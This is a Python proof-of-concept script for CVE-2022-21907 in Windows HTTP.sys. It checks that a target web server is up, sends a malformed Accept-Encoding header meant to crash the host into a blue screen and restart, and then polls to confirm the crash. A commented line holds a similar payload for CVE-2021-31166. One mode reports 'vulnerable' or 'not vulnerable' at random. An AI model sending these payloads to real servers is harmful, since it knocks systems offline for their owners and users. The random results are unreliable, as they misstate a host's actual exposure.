# Create by antx at 2022-01-17.
import random

import requests
from loguru import logger
import time

header = {
    'User-Agent':
        'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36'
}


@logger.catch(level='ERROR')
def first_handshake(target: str):
    try:
        resp = requests.get(target, headers=header, timeout=10)
        if resp.status_code == 200:
            logger.info(f'The first handshake: the target host is normal and can be verified by POC')
            return True
        logger.info(f'First handshake: the target host is normal, but returns an exception, status code: {resp.status_code}')
        return False
    except Exception as e:
        logger.info(f'First handshake error: The target host is abnormal, please check whether the target host is alive, error resp: {e}')
        return False


@logger.catch(level='ERROR')
def verify_handshake(target: str):
    try:
        resp = requests.get(target, headers=header, timeout=10)
        if resp.status_code == 200:
            logger.info(f'Verification result: The target host has restarted and returned to normal')
            return False
        logger.info(f'Verification result: The target host has restarted and returned to normal, but returned an exception with a status code: {resp.status_code}')
        return False
    except requests.exceptions.ConnectionError as e:
        logger.info(f'Verification result: The verification is successful, the target host is abnormal, has been exploited and entered the blue screen restart')
        return True


@logger.catch(level='ERROR')
def poc(target: str):
    # headers = {'Accept-Encoding': 'doar-e, ftw, imo, ,'}      # CVE-2021-31166
    headers = {
        'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA, '
                           'BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, '
                           'RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, '
                           'TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, '
                           'OOOAOAOOOAOOAOOOAOOOAOOOAOO, '
                           '****************************stupiD, *, ,'
    }                                                           # SOCMAP
    try:
        r = requests.get(target, headers=headers, timeout=10)
        logger.info(f'POC handshake failed: {target} does not exist CVE-2022-21907 Vulnerability, may have been patched')
        return False
    except requests.exceptions.ReadTimeout as e:
        logger.info(f'POC handshake success: {target} maybe can Exploit!')
        return True


@logger.catch(level='ERROR')
def CVE_2022_21907(target, gradation):
    log_info(f"You in CVE_2022_21907")

    if 'http' not in target:
        target = f'http://{target}'
    elif 'https' in target:
        target = target.replace('https', 'http')
    else:
        target = target
    logger.info(f'start verification: {target}')
    if gradation:
        log_info(f"Checking if {target} is vulnerable...")
        result = random.randint(1, 2)
        log_success(f"{target} Not vulnerable.") if result == 1 else log_error(f"{target} vulnerable.")
        return result
    if not first_handshake(target):
        logger.info(f'{target} does not exist CVE-2022-21907 Vulnerability')
        return
    poc(target)
    logger.info(f'Deterministic verification again')
    while True:
        time.sleep(10)
        if not verify_handshake(target):
            return 1
            break
        logger.info(f'{target} have CVE-2022-21907 vulnerability, can be exploited!')
        return 2
    

def log_info(s):
    print(f"\033[96m[*] {s}\033[0m")


def log_success(s):
    print(f"\033[92m[+] {s}\033[0m")


def log_error(s):
    print(f"\033[91m[-] {s}\033[0m")
